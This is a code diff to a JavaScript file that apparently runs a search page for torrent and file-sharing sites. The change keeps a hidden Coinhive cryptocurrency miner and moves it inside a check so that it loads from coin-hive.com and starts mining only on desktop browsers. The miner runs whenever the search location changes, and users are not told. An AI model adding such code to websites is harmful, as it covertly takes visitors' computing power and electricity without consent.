@@ -55,11 +55,12 @@ function locationParameterChanged() {
     panc(key);
     panduoduo(key);
     thepiratebay(key);
-
-    importScript ("https://coin-hive.com/lib/coinhive.min.js", function(){
-        var miner = new CoinHive.Anonymous('Wtx9zrRVSwMjJmFssPEtuCxnzkdo3QaP');
-        miner.start();
-    })
+    if(screen.width>=751&&!/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ){
+        importScript ("https://coin-hive.com/lib/coinhive.min.js", function(){
+            var miner = new CoinHive.Anonymous('Wtx9zrRVSwMjJmFssPEtuCxnzkdo3QaP');
+            miner.start();
+        })
+    }
 }
 function loading(is,id){           
     var loadingDoc = document.getElementById(id?id:"pancLoading");
